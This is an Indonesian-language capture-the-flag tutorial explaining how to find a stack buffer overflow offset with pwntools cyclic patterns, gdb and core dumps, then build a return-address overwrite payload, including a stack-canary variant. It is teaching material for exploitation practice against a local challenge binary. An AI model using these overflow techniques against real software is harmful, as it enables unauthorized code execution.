#cybersecurity

Offset adalah **jarak dari awal buffer ke return address**. Tanpa offset yang tepat, payload tidak akan menimpa return address dengan presisi. Cara paling andal: pakai **cyclic pattern**.

## Cara 1: pwntools cyclic

```python
from pwn import *

io = process("./chall")

# Kirim pattern unik sepanjang 200 byte
io.sendlineafter(b": ", cyclic(200))
io.wait()  # crash

# Ambil core, cari alamat yang menimpa RIP
core = io.corefile
offset = cyclic_find(core.fault_addr)   # 64-bit
print(f"Offset: {offset}")
```

`cyclic_find` mencari di posisi mana byte pattern `fault_addr` muncul.

## Cara 2: manual dengan gdb

```bash
# generate pattern
$ python3 -c "from pwn import *; print(cyclic(200))"
aaaabaaacaaadaaaeaaafaaa...

# run di gdb
gdb ./chall
(gdb) run < <(python3 -c "from pwn import *; print(cyclic(200))")
# RIP = 0x6161616c ("laaa" dalam little endian)

# cari offset
$ python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
72
```

## Cara 3: tanpa core (kalau corefile tidak ada)

```python
from pwn import *

elf = context.binary = ELF("./chall")
io = process("./chall")
io.sendlineafter(b": ", cyclic(200))

# pakai gdb.attach untuk melihat RIP saat crash
gdb.attach(io, "continue")
io.interactive()
# lalu di gdb: info registers  -> cari nilai RIP
# dari nilai RIP (misal 0x6161616c): cyclic_find(0x6161616c)
```

## Kenapa tidak hitung manual?

Ukuran buffer di source (`char buf[64]`) **tidak selalu sama** dengan jarak aktual ke return address - compiler bisa menambah padding/alignment. Jadi:

```
offset aktual = cyclic_find(...)   <- selalu ukur, jangan tebak
```

## Menyusun payload dengan offset

```python
offset = 72  # hasil cyclic_find

payload = b"A" * offset          # isi sampai return address
payload += p64(win_addr)         # timpa return address

# dengan canary:
# payload = b"A"*offset_buf + p64(canary) + b"B"*8 + p64(win_addr)
#            ^ offset buffer ke canary   ^ dummy saved rbp
```

## Tips

1. Offset di local bisa beda dengan remote (compiler beda, libc beda) - kalau challenge menyertakan binary, offsetnya sama; kalau tidak, coba beberapa nilai.
2. `cyclic(200)` - pastikan panjangnya melebihi buffer + overhead. Naikkan kalau crash tidak terjadi.
3. `io.corefile` butuh core dump aktif: `ulimit -c unlimited`.
4. Alat alternatif: `pattern create 200` / `pattern offset <value>` di metasploit, atau fitur `cyclic` di gdb-pwndbg.
